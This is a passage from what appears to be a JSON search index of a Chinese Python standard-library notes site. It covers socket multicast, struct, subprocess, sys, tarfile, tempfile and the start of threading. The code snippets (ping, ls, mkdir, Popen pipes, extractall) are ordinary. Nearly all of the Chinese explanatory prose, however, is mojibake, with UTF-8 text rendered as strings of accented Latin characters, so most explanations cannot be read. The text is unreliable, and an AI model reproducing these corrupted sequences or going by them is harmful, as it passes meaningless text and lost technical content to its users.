ä¸€ä¸ª4/8å­—èŠ‚æ•´æ•°,æ€»é•¿åº¦ä¸º8/12å­—èŠ‚: mreq = struct.pack('4sL', group, socket.INADDR_ANY) 4s:4ä¸ªå­—ç¬¦,ä½¿ç”¨sè¡¨ç¤ºã€‚è¿™å°†æ‰“åŒ…æˆ4ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸² L:1ä¸ªé•¿æ•´å‹(long integer),ä½¿ç”¨Lè¡¨ç¤ºã€‚è¿™å°†æ‰“åŒ…æˆ4å­—èŠ‚(32ä½)æˆ–8å­—èŠ‚(64ä½)çš„æ•´æ•°,å–å†³äºå¹³å° å°†socketåŠ å…¥åˆ°æŒ‡å®šçš„å¤šæ’­ç»„ä¸­: sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) socketçš„recvfromä¸recvåŒºåˆ« å‚æ•°ä¸ªæ•° recvfrom(bufsize, flags) æ¥æ”¶æ•°æ®å¹¶åŒ…å«å‘é€æ–¹åœ°å€ä¿¡æ¯ã€‚ recv(bufsize, flags) ä»…æ¥æ”¶æ•°æ®,ä¸åŒ…å«å‘é€æ–¹åœ°å€ä¿¡æ¯ã€‚ è¿”å›å€¼ recvfrom() è¿”å›å€¼æ˜¯(data, address)ã€‚åŒ…å«æ¥æ”¶çš„æ•°æ®å’Œå‘é€æ–¹åœ°å€ã€‚ recv() è¿”å›å€¼åªæœ‰æ¥æ”¶çš„æ•°æ®dataã€‚ ä½¿ç”¨åœºæ™¯ recvfrom() Typically used on UDP sockets where sender address matters. é€šå¸¸ç”¨äºUDPå¥—æ¥å­—,éœ€è¦è·å–å‘é€æ–¹åœ°å€ä¿¡æ¯ã€‚ recv() Typically used on TCP sockets where sender address does not matter. é€šå¸¸ç”¨äºTCPå¥—æ¥å­—,ä¸éœ€è¦è·å–å‘é€æ–¹åœ°å€ä¿¡æ¯ã€‚ æ€»ç»“ å¦‚æœæ˜¯TCPå¥—æ¥å­—,æˆ–è€…å‘é€æ–¹åœ°å€ä¿¡æ¯ä¸é‡è¦,ä½¿ç”¨recv()ã€‚ å¦‚æœæ˜¯UDPå¥—æ¥å­—,æˆ–è€…éœ€è¦è·å–å‘é€æ–¹åœ°å€ä¿¡æ¯,ä½¿ç”¨recvfrom()ã€‚ å‚è€ƒ: socket-åº•å±‚ç½‘ç»œæ¥å£ è¯´æ˜ recv(bufsize, flags) çš„bufsizeå†³å®šä¸€æ¬¡èƒ½æ¥å—å¤šå°‘æ•°æ®, sendä¹Ÿæ˜¯, å¦‚æœæ•°æ®é‡å¤§ å»ºè®®å°†å¤§æ•°æ®åˆ†æˆå¤šæ¬¡å¾ªç¯å‘é€.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-socket.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-socket.html"},{"title":"socketserver","text":"ç”¨äºç®€åŒ–ç½‘ç»œæœåŠ¡ç«¯ç¼–å†™çš„ç±»ã€‚(ç®€åŒ–socketå¼€å‘)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-socketserver.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-socketserver.html"},{"title":"struct","text":"ä¸cåº•å±‚æ•°æ®åšè½¬æ¢, è®¾è®¡åˆ°äº†å­—èŠ‚, å¤§å°ç«¯, æ•°æ®æµç­‰çš„çŸ¥è¯† å¸¸ç”¨å‡½æ•°: pack(fmt,v1,v2â€¦) è¿”å›string. æŒ‰ç…§ç»™å®šçš„æ ¼å¼(fmt),æŠŠæ•°æ®è½¬æ¢æˆå­—ç¬¦ä¸²(å­—èŠ‚æµ),å¹¶å°†è¯¥å­—ç¬¦ä¸²è¿”å›. unpack(fmt,v1,v2â€¦..) è¿”å›tuple. æŒ‰ç…§ç»™å®šçš„æ ¼å¼(fmt)è§£æå­—èŠ‚æµ,å¹¶è¿”å›è§£æç»“æœ calcsize(fmt) è¿”å›size of fmt. è®¡ç®—ç»™å®šçš„æ ¼å¼(fmt)å ç”¨å¤šå°‘å­—èŠ‚çš„å†…å­˜ï¼Œæ³¨æ„å¯¹é½æ–¹å¼ è¯¦æƒ…å‚è§:: https://blog.csdn.net/qq_30638831/article/details/80421019","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-struct.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-struct.html"},{"title":"subprocess","text":"call check_call ä¾‹, check_call()æ­£å¸¸æ‰§è¡Œå‘½ä»¤: >>> import subprocess >>> p = subprocess.check_call(['ping', '-c', '2', 'www.baidu.com']) PING www.baidu.com (39.156.66.14): 56 data bytes 64 bytes from 39.156.66.14: icmp_seq=0 ttl=52 time=40.865 ms 64 bytes from 39.156.66.14: icmp_seq=1 ttl=52 time=48.753 ms --- www.baidu.com ping statistics --- 2 packets transmitted, 2 packets received, 0.0% packet loss round-trip min/avg/max/stddev = 40.865/44.809/48.753/3.944 ms >>> p 0 ä¾‹, check_call()é”™è¯¯æ‰§è¡Œå‘½ä»¤: >>> p = subprocess.check_call(['ping', '-c', '2', 'www.xxxxxdu.com']) ping: cannot resolve www.xxxxxdu.com: Unknown host Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 373, in check_call raise CalledProcessError(retcode, cmd) subprocess.CalledProcessError: Command '['ping', '-c', '2', 'www.xxxxxdu.com']' returned non-zero exit status 68. >>> p 0 check_output ä¾‹, check_output() è°ƒç”¨çš„å­è¿›ç¨‹æ­£å¸¸ä¸é”™è¯¯é€€å‡º: >>> subprocess.check_output([\"echo\", \"Hello World!\"]) b'Hello World!\\n' >>> subprocess.check_output(\"exit 1\", shell=True) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 424, in check_output return run(*popenargs, stdout=PIPE, timeout=timeout, check=True, File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 528, in run raise CalledProcessError(retcode, process.args, subprocess.CalledProcessError: Command 'exit 1' returned non-zero exit status 1. >>> æ³¨è§£ ä½¿ç”¨ä¸Šé¢æåˆ°çš„ä¸‰ä¸ªæ–¹æ³•: call(), check_call(), check_output() æ—¶, å°½é‡ä¸è¦å°†å‚æ•° stderr å’Œ stdout è®¾ç½®ä¸º subprocess.PIPE , è¿™å‡ ä¸ªå‡½æ•°é»˜è®¤éƒ½ä¼šç­‰å¾…å­è¿›ç¨‹å®Œæˆ, å­è¿›ç¨‹äº§ç”Ÿå¤§é‡çš„è¾“å‡ºæ•°æ®å¦‚æœé€ æˆç®¡é“å µå¡, çˆ¶è¿›ç¨‹å†ç­‰å¾…å­è¿›ç¨‹å®Œæˆå¯èƒ½é€ æˆæ­»é”ã€‚ Popen å…³äº shell: bool = False å‚æ•° æœ‰éœ€æ±‚åœ¨linuxä¸‹ä½¿ç”¨pkexecæ¥ç”³è¯·æƒé™, å¦‚æ‰§è¡Œls å¯ä»¥æˆåŠŸæ‰§è¡Œçš„ä¸¤ç§è°ƒç”¨: subprocess.Popen('pkexec ls', shell=True) subprocess.Popen(['sh', '-c', 'pkexec ls'], shell=False) ä¸èƒ½ç”Ÿæ•ˆçš„è°ƒç”¨(å¼¹å‡ºç•Œé¢ä¸€é—ªè€Œé€æˆ–è€…å‹æ ¹ä¸æ˜¾ç¤º): subprocess.Popen(['pkexec', 'ls'], shell=False) åé¢å‘ç°è¿™ä¸ªè²Œä¼¼å®é™…æ˜¯: pkexec ls & ä¸è¿™ä¸ªçš„åŒºåˆ«: sh -c \"pkexec ls\" æ³¨è§£ å¯¹äºçš„ç³»ç»Ÿå‘½ä»¤è€Œè¨€, å½“å­˜åœ¨å…³é”®è¯å‚æ•°ä¸”å‚æ•°çš„å€¼æœ‰ç©ºæ ¼æ—¶, ä¸è¦ä½¿ç”¨: Popen(['cmd', '--update=t t t']) è€Œæ˜¯ä½¿ç”¨: Popen(['cmd', '--update', 't t t']) å› ä¸ºå‰è€…ä¼šæŠŠ '--update=t t t' è§£æä¸ºå¸¦å¼•å·çš„å­—ç¬¦ä¸²: \"--update=t t t\" ä»è€Œå¯¼è‡´è¯†åˆ«ä¸äº†å…³é”®å­—å‚æ•° --update ä¾‹1: import subprocess ret1 = subprocess.Popen([\"mkdir\",\"t1\"]) ret2 = subprocess.Popen(\"mkdir t2\", shell=True) æ³¨è§£ ç»ˆç«¯è¾“å…¥çš„å‘½ä»¤åˆ†ä¸ºä¸¤ç§ï¼š éäº¤äº’å¼: è¾“å…¥å³å¯å¾—åˆ°è¾“å‡º, å¦‚ ifconfig äº¤äº’å¼: è¾“å…¥è¿›è¡ŒæŸç¯å¢ƒ, ä¾èµ–å†è¾“å…¥, å¦‚ python ä¾‹2: import subprocess obj = subprocess.Popen(\"mkdir t3\", shell=True, cwd='/home/dev',) #åœ¨cwdç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ import subprocess obj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) obj.stdin.write(\"print(1)\\n\") obj.stdin.write(\"print(2)\") obj.stdin.close() cmd_out = obj.stdout.read() obj.stdout.close() cmd_error = obj.stderr.read() obj.stderr.close() print(cmd_out) print(cmd_error) import subprocess obj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) obj.stdin.write(\"print(1)\\n\") obj.stdin.write(\"print(2)\") out_error_list = obj.communicate() print(out_error_list) import subprocess obj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) out_error_list = obj.communicate('print(\"hello\")') print(out_error_list) ä¾‹3: åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹, ç„¶åæ‰§è¡Œä¸€ä¸ªç®€å•çš„å‘½ä»¤: >>> import subprocess >>> p = subprocess.Popen('ls -l', shell=True) >>> total 164 -rw-r--r-- 1 root root 133 Jul 4 16:25 admin-openrc.sh -rw-r--r-- 1 root root 268 Jul 10 15:55 admin-openrc-v3.sh ... >>> p.returncode >>> p.wait() 0 >>> p.returncode 0 è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ p = subprocess.Popen(['ls', '-cl']) æ¥åˆ›å»ºå­è¿›ç¨‹ã€‚ å±æ€§ Popenåˆ›å»ºçš„å­è¿›ç¨‹æœ‰ä¸€äº›æœ‰ç”¨çš„å±æ€§, å‡è®¾ p æ˜¯ Popen åˆ›å»ºçš„å­è¿›ç¨‹, p çš„å±æ€§åŒ…æ‹¬ï¼š p.pid : å­è¿›ç¨‹çš„PIDã€‚ p.returncode : è¯¥å±æ€§è¡¨ç¤ºå­è¿›ç¨‹çš„è¿”å›çŠ¶æ€. returncodeå¯èƒ½æœ‰å¤šé‡æƒ…å†µ: None â€”â€” å­è¿›ç¨‹å°šæœªç»“æŸï¼› ==0 â€”â€” å­è¿›ç¨‹æ­£å¸¸é€€å‡ºï¼› > 0 â€”â€” å­è¿›ç¨‹å¼‚å¸¸é€€å‡º, returncode å¯¹åº”äºå‡ºé”™ç ï¼› < 0 â€”â€” å­è¿›ç¨‹è¢«ä¿¡å·æ€æ‰äº†ã€‚ p.stdin, p.stdout, p.stderr : å­è¿›ç¨‹å¯¹åº”çš„ä¸€äº›åˆå§‹æ–‡ä»¶, å¦‚æœè°ƒç”¨Popen()çš„æ—¶å€™å¯¹åº”çš„å‚æ•°æ˜¯subprocess.PIPE, åˆ™è¿™é‡Œå¯¹åº”çš„å±æ€§æ˜¯ä¸€ä¸ªåŒ…è£¹äº†è¿™ä¸ªç®¡é“çš„ file å¯¹è±¡, æ–¹æ³• subprocessæ¨¡å—çš„å…¶ä»–å±æ€§ subprocess.PIPE : è°ƒç”¨æœ¬æ¨¡å—æä¾›çš„è‹¥å¹²å‡½æ•°æ—¶, å¯ä½œä¸º std å‚æ•°çš„å€¼, ä¸ºæ ‡å‡†æµæ–‡ä»¶æ‰“å¼€ä¸€ä¸ªç®¡é“. ä¾‹: ä½¿ç”¨ç®¡é“è¿æ¥æ ‡å‡†æµæ–‡ä»¶: import subprocess child1 = subprocess.Popen([ 'ls' , '-l' ], stdout = subprocess.PIPE) child2 = subprocess.Popen([ 'wc' , '-l' ], stdin = child1.stdout, stdout = subprocess.PIPE) out = child2.communicate() child1.wait() child2.wait() print (out) è¿™é‡Œå°†å­è¿›ç¨‹ child1 çš„æ ‡å‡†è¾“å‡ºä½œä¸ºå­è¿›ç¨‹ child2 çš„æ ‡å‡†è¾“å…¥, çˆ¶è¿›ç¨‹é€šè¿‡ communicate() è¯»å– child2 çš„æ ‡å‡†è¾“å‡ºåæ‰“å°ã€‚ subprocess.STDOUT : è°ƒç”¨æœ¬æ¨¡å—æä¾›çš„è‹¥å¹²å‡½æ•°æ—¶, å¯ä½œä¸º stderr å‚æ•°çš„å€¼, å°†å­è¿›ç¨‹çš„æ ‡å‡†é”™è¯¯è¾“å‡ºæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚ subprocessæ¨¡å—å®šä¹‰çš„å¼‚å¸¸ æ€»ç»“ ä½¿ç”¨ Popen å¯ä»¥åœ¨Pythonè¿›ç¨‹ä¸­åˆ›å»ºå­è¿›ç¨‹ å¦‚æœåªå¯¹å­è¿›ç¨‹çš„æ‰§è¡Œé€€å‡ºçŠ¶æ€æ„Ÿå…´è¶£, å¯ä»¥è°ƒç”¨ subprocess.call() å‡½æ•° å¦‚æœæƒ³é€šè¿‡å¼‚å¸¸å¤„ç†æœºåˆ¶è§£å†³å­è¿›ç¨‹å¼‚å¸¸é€€å‡ºçš„æƒ…å½¢, å¯ä»¥è€ƒè™‘ä½¿ç”¨ subprocess.check_call() å’Œ subprocess.check_outputã€‚ å¦‚æœå¸Œæœ›è·å¾—å­è¿›ç¨‹çš„è¾“å‡º, å¯ä»¥è°ƒç”¨ subprocess.check_output(), ä½† Popen() æ— ç–‘æ˜¯åŠŸèƒ½æœ€å¼ºå¤§çš„ã€‚ subprocessæ¨¡å—çš„ç¼ºé™·åœ¨äºé»˜è®¤æä¾›çš„çˆ¶å­è¿›ç¨‹é—´é€šä¿¡æ‰‹æ®µæœ‰é™, åªæœ‰ç®¡é“ï¼›åŒæ—¶åˆ›å»ºçš„å­è¿›ç¨‹ä¸“é—¨ç”¨æ¥æ‰§è¡Œå¤–éƒ¨çš„ç¨‹åºæˆ–å‘½ä»¤ã€‚ Linuxä¸‹è¿›ç¨‹é—´é€šä¿¡çš„æ‰‹æ®µå¾ˆå¤š, å­è¿›ç¨‹ä¹Ÿå®Œå…¨å¯èƒ½ä»åˆ›å»ºä¹‹åç»§ç»­è°ƒç”¨ å‚è€ƒ:: python - subprocess.Popen()å¤šè¿›ç¨‹ subprocess: å¯ä»¥åœ¨å½“å‰ç¨‹åºä¸­æ‰§è¡Œå…¶ä»–ç¨‹åºæˆ–å‘½ä»¤","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-subprocess.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-subprocess.html"},{"title":"sys","text":"å®˜ç½‘: sys --- ç³»ç»Ÿç›¸å…³çš„å‚æ•°å’Œå‡½æ•° è¯¥æ¨¡å—æä¾›äº†ä¸€äº›å˜é‡å’Œå‡½æ•°ã€‚ è¿™äº›å˜é‡å¯èƒ½è¢«è§£é‡Šå™¨ä½¿ç”¨ï¼Œä¹Ÿå¯èƒ½ç”±è§£é‡Šå™¨æä¾›ã€‚ è¿™äº›å‡½æ•°ä¼šå½±å“è§£é‡Šå™¨ã€‚ æœ¬æ¨¡å—æ€»æ˜¯å¯ç”¨çš„ã€‚ ä»…è®°å½•å¸¸ç”¨çš„ å±æ€§ sys.argv ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«äº†è¢«ä¼ é€’ç»™ Python è„šæœ¬çš„å‘½ä»¤è¡Œå‚æ•°ã€‚ argv[0] ä¸ºè„šæœ¬çš„åç§°ï¼ˆæ˜¯å¦æ˜¯å®Œæ•´çš„è·¯å¾„åå–å†³äºæ“ä½œç³»ç»Ÿï¼‰ã€‚ å¦‚æœæ˜¯é€šè¿‡ Python è§£é‡Šå™¨çš„å‘½ä»¤è¡Œå‚æ•° -c æ¥æ‰§è¡Œçš„ï¼Œ argv[0] ä¼šè¢«è®¾ç½®æˆå­—ç¬¦ä¸² '-c' ã€‚ å¦‚æœæ²¡æœ‰è„šæœ¬åè¢«ä¼ é€’ç»™ Python è§£é‡Šå™¨ï¼Œ argv[0] ä¸ºç©ºå­—ç¬¦ä¸²ã€‚ ä¸ºäº†éå†æ ‡å‡†è¾“å…¥ï¼Œæˆ–è€…é€šè¿‡å‘½ä»¤è¡Œä¼ é€’çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå‚ç…§ fileinput æ¨¡å— å¦è¯·å‚é˜… sys.orig_argvã€‚ æ³¨è§£ åœ¨ Unix ä¸Šï¼Œç³»ç»Ÿä¼ é€’çš„å‘½ä»¤è¡Œå‚æ•°æ˜¯å­—èŠ‚ç±»å‹çš„ã€‚Python ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿç¼–ç å’Œ \"surrogateescape\" é”™è¯¯å¤„ç†æ–¹æ¡ˆå¯¹å®ƒä»¬è¿›è¡Œè§£ç ã€‚å½“éœ€è¦åŸå§‹å­—èŠ‚æ—¶ï¼Œå¯ä»¥é€šè¿‡ [os.fsencode(arg) for arg in sys.argv] æ¥è·å–ã€‚ sys.base_exec_prefix å®˜ç½‘è¯´çš„æœ‰ç‚¹å¤æ‚. å®é™…å°±æ˜¯è™šæ‹Ÿç¯å¢ƒç›®å½• sys.base_prefix ä¸€èˆ¬ä¸ä¸Šä¸€ä¸ªä¸€è‡´. sys.byteorder æœ¬åœ°å­—èŠ‚é¡ºåºçš„æŒ‡ç¤ºç¬¦ã€‚ åœ¨å¤§ç«¯åºï¼ˆæœ€é«˜æœ‰æ•ˆä½ä¼˜å…ˆï¼‰æ“ä½œç³»ç»Ÿä¸Šå€¼ä¸º 'big' ï¼Œ åœ¨å°ç«¯åºï¼ˆæœ€ä½æœ‰æ•ˆä½ä¼˜å…ˆï¼‰æ“ä½œç³»ç»Ÿä¸Šä¸º 'little' sys.executable: str æä¾› Python è§£é‡Šå™¨çš„å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œä»…åœ¨éƒ¨åˆ†ç³»ç»Ÿä¸­æ­¤å€¼æœ‰æ„ä¹‰ã€‚ å¦‚æœ Python æ— æ³•è·å–å…¶å¯æ‰§è¡Œæ–‡ä»¶çš„çœŸå®è·¯å¾„ï¼Œåˆ™ sys.executable å°†ä¸ºç©ºå­—ç¬¦ä¸²æˆ– Noneã€‚ sys.modules è¿™æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå®ƒå°†æ¨¡å—åç§°æ˜ å°„åˆ°å·²ç»è¢«åŠ è½½çš„æ¨¡å—ã€‚ è¿™å¯ä»¥è¢«æ“çºµæ¥å¼ºåˆ¶é‡æ–°åŠ è½½æ¨¡å—å’Œå…¶ä»–æŠ€å·§ã€‚ ç„¶è€Œï¼Œæ›¿æ¢è¿™ä¸ªå­—å…¸ä¸ä¸€å®šä¼šåƒé¢„æœŸçš„é‚£æ ·å·¥ä½œï¼Œä»å­—å…¸ä¸­åˆ é™¤é‡è¦çš„é¡¹ç›®å¯èƒ½ä¼šå¯¼è‡´ Python å‡ºé”™ã€‚ å¦‚æœä½ æƒ³å¯¹è¿™ä¸ªå…¨å±€å­—å…¸è¿›è¡Œè¿­ä»£ï¼Œä¸€å®šè¦ä½¿ç”¨ sys.modules.copy() æˆ– tuple(sys.modules) æ¥é¿å…å¼‚å¸¸ï¼Œ å› ä¸ºå®ƒçš„å¤§å°åœ¨è¿­ä»£è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå› ä¸ºå…¶ä»–çº¿ç¨‹ä¸­çš„ä»£ç æˆ–æ´»åŠ¨çš„å‰¯ä½œç”¨è€Œæ”¹å˜ã€‚ sys.orig_argv ä¼ ç»™ Python å¯æ‰§è¡Œæ–‡ä»¶çš„åŸå§‹å‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨ã€‚ sys.path ä¸€ä¸ªç”±å­—ç¬¦ä¸²ç»„æˆçš„åˆ—è¡¨ï¼Œç”¨äºæŒ‡å®šæ¨¡å—çš„æœç´¢è·¯å¾„ã€‚ åˆå§‹åŒ–è‡ªç¯å¢ƒå˜é‡ PYTHONPATHï¼Œå†åŠ ä¸Šä¸€æ¡ä¸å®‰è£…æœ‰å…³çš„é»˜è®¤è·¯å¾„ã€‚ sys.platform æœ¬å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå¹³å°æ ‡è¯†ç¬¦. å¯¹äº Unix ç³»ç»Ÿï¼ˆé™¤ Linux å’Œ AIX å¤–ï¼‰ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯ Python æ„å»ºæ—¶çš„ uname -s è¿”å›çš„å°å†™æ“ä½œç³»ç»Ÿåç§°ï¼Œ å¹¶é™„åŠ äº† uname -r è¿”å›çš„ç³»ç»Ÿç‰ˆæœ¬çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå¦‚ 'sunos5' æˆ– 'freebsd8' å¯¹äºå…¶ä»–ç³»ç»Ÿ: ç³»ç»Ÿ å¹³å°å€¼ AIX 'aix' Emscripten 'emscripten' Linux 'linux' WASI 'wasi' Windows 'win32' Windows/Cygwin 'cygwin' macOS 'darwin' sys.platlibdir å¹³å°ä¸“ç”¨åº“ç›®å½•ã€‚ç”¨äºæ„å»ºæ ‡å‡†åº“çš„è·¯å¾„å’Œå·²å®‰è£…æ‰©å±•æ¨¡å—çš„è·¯å¾„ã€‚ åœ¨å¤§å¤šæ•°å¹³å°ä¸Šï¼Œå®ƒç­‰åŒäº \"lib\" sys.stdin;sys.stdout;sys.stderr è§£é‡Šå™¨ç”¨äºæ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯çš„ æ–‡ä»¶å¯¹è±¡ sys.version ä¸€ä¸ªåŒ…å« Python è§£é‡Šå™¨ç‰ˆæœ¬å·åŠ ç¼–è¯‘ç‰ˆæœ¬å·ä»¥åŠæ‰€ç”¨ç¼–è¯‘å™¨ç­‰é¢å¤–ä¿¡æ¯çš„å­—ç¬¦ä¸²ã€‚ è¯·ä¸è¦ä»ä¸­æå–ç‰ˆæœ¬ä¿¡æ¯ï¼Œè€Œåº”å½“ä½¿ç”¨ version_info ä»¥åŠ platform æ¨¡å—æ‰€æä¾›çš„å‡½æ•°ã€‚ sys.api_version è¿™ä¸ªè§£é‡Šå™¨çš„ C API ç‰ˆæœ¬ã€‚å½“ä½ åœ¨è°ƒè¯• PythonåŠæœŸæ‰©å±•æ¨¡æ¿çš„ç‰ˆæœ¬å†²çªè¿™ä¸ªåŠŸèƒ½éå¸¸æœ‰ç”¨ã€‚ sys.version_info ä¸€ä¸ªåŒ…å«ç‰ˆæœ¬å·äº”éƒ¨åˆ†çš„å…ƒç»„: major, minor, micro, releaselevel å’Œ serialã€‚ é™¤ releaselevel å¤–çš„æ‰€æœ‰å€¼å‡ä¸ºæ•´æ•°ï¼›å‘å¸ƒçº§åˆ«å€¼åˆ™ä¸º 'alpha', 'beta', 'candidate' æˆ– 'final'ã€‚ å¯¹åº”äº Python ç‰ˆæœ¬ 2.0 çš„ version_info å€¼ä¸º (2, 0, 0, 'final', 0)ã€‚ è¿™äº›éƒ¨åˆ†ä¹Ÿå¯æŒ‰åç§°è®¿é—®ï¼Œå› æ­¤ sys.version_info[0] å°±ç­‰ä»·äº sys.version_info.majorï¼Œä¾æ­¤ç±»æ¨ã€‚ åœ¨ 3.1 ç‰ˆæ›´æ”¹: å¢åŠ äº†ä»¥åç§°è¡¨ç¤ºçš„å„éƒ¨åˆ†å±æ€§ã€‚ sys.maxsize ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤º Py_ssize_t ç±»å‹çš„å˜é‡å¯ä»¥å–åˆ°çš„æœ€å¤§å€¼ã€‚ åœ¨ 32 ä½å¹³å°ä¸Šé€šå¸¸ä¸º 2**31 - 1ï¼Œåœ¨ 64 ä½å¹³å°ä¸Šé€šå¸¸ä¸º 2**63 - 1ã€‚ sys.maxunicode ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§çš„ Unicode ç ç‚¹å€¼ï¼Œå¦‚ 1114111 ï¼ˆåå…­è¿›åˆ¶ä¸º 0x10FFFF ï¼‰ã€‚ åœ¨ 3.3 ç‰ˆæ›´æ”¹: åœ¨ PEP 393 ä¹‹å‰ï¼Œsys.maxunicode æ›¾æ˜¯ 0xFFFF æˆ– 0x10FFFFï¼Œ å…·ä½“å–å†³äºé…ç½®é€‰é¡¹ï¼Œè¯¥é€‰é¡¹æŒ‡å®šå°† Unicode å­—ç¬¦å­˜å‚¨ä¸º UCS-2 è¿˜æ˜¯ UCS-4ã€‚ å‡½æ•°","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-sys.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-sys.html"},{"title":"tarfile","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/tarfile.html è¯»å†™tarå½’æ¡£æ–‡ä»¶, åŒ…æ‹¬ä½¿ç”¨ gzip, bz2 å’Œ lzma å‹ç¼©çš„å½’æ¡£ å¸¸ç”¨: with tarfile.open('xxx.tar.gz', 'r:gz') as tar: tar.extractall(path='./data_dir')","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-tarfile.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-tarfile.html"},{"title":"tempfile","text":"tempfile --- ç”Ÿæˆä¸´æ—¶æ–‡ä»¶å’Œç›®å½• å®˜ç½‘: https://docs.python.org/zh-cn/3/library/tempfile.html è¯¥æ¨¡å—ç”¨äºåˆ›å»ºä¸´æ—¶æ–‡ä»¶å’Œç›®å½•ï¼Œå®ƒå¯ä»¥è·¨å¹³å°ä½¿ç”¨ã€‚ TemporaryFileã€NamedTemporaryFileã€TemporaryDirectory å’Œ SpooledTemporaryFile æ˜¯å¸¦æœ‰è‡ªåŠ¨æ¸…ç†åŠŸèƒ½çš„é«˜çº§æ¥å£ï¼Œå¯ç”¨ä½œä¸Šä¸‹æ–‡ç®¡ç†å™¨ã€‚ mkstemp() å’Œ mkdtemp() æ˜¯ä½çº§å‡½æ•°ï¼Œä½¿ç”¨å®Œæ¯•éœ€æ‰‹åŠ¨æ¸…ç†ã€‚ æœ¬æ¨¡å—ä½¿ç”¨ä¸€ä¸ªå…¨å±€å˜é‡æ¥å­˜å‚¨ç”± gettempdir() è¿”å›çš„ä¸´æ—¶æ–‡ä»¶ä½¿ç”¨çš„ç›®å½•è·¯å¾„ã€‚ å®ƒå¯è¢«ç›´æ¥è®¾ç½®ä»¥è¦†ç›–é€‰æ‹©è¿‡ç¨‹ï¼Œä½†ä¸å»ºè®®è¿™æ ·åšã€‚ æœ¬æ¨¡å—ä¸­çš„æ‰€æœ‰å‡½æ•°éƒ½æ¥å—ä¸€ä¸ª dir å‚æ•°ï¼Œå®ƒå¯è¢«ç”¨äºæŒ‡å®šç›®å½•ã€‚ è¿™æ˜¯ä¸ä¼šé€šè¿‡æ”¹å˜å…¨å±€ API è¡Œä¸ºå¯¹å…¶ä»–æ— å‡†å¤‡ä»£ç é€ æˆå½±å“çš„æ¨èåšæ³•ã€‚ ç”¨ä¾‹: import tempfile # create a temporary file and write some data to it fp = tempfile.TemporaryFile() fp.write(b'Hello world!') # read data from file fp.seek(0) fp.read() b'Hello world!' # close the file, it will be removed fp.close() # create a temporary file using a context manager with tempfile.TemporaryFile() as fp: fp.write(b'Hello world!') fp.seek(0) fp.read() b'Hello world!' >>> # file is now closed and removed # create a temporary directory using the context manager with tempfile.TemporaryDirectory() as tmpdirname: print('created temporary directory', tmpdirname) >>> # directory and contents have been removed","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-tempfile.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-tempfile.html"},{"title":"threadingæ¨¡å—","text":"å®˜ç½‘æ–‡æ¡£:: threading threading.Threadçš„å¸¸è§æ–¹æ³• run() çº¿ç¨‹çš„ä¸»è¦æ‰§è¡Œä½“, ç”¨äºå­ç±»é‡å†™, ç›´æ¥è°ƒç”¨ä¸ä¼šè§¦å‘å¤šçº¿ç¨‹ start() å¯åŠ¨æ–°çº¿ç¨‹çš„æ–¹å¼, å¼€å¯ä¸€ä¸ªæ–°çº¿ç¨‹å»æ‰§è¡Œrunæ–¹æ³•(å®ç°å¤šçº¿ç¨‹), æ¯ä¸ªå®šä¹‰çš„çº¿ç¨‹åªèƒ½startä¸€æ¬¡, å¦‚æœè°ƒç”¨å¤šæ¬¡ï¼Œåˆ™ä¼šæŠ¥RuntimeErroré”™è¯¯ join(timeout=None) é˜»å¡å½“å‰çº¿ç¨‹, ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œç»“æŸ setDaemon(True) å°†çº¿ç¨‹è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹, å¦‚æœä¸»çº¿ç¨‹é€€å‡º, 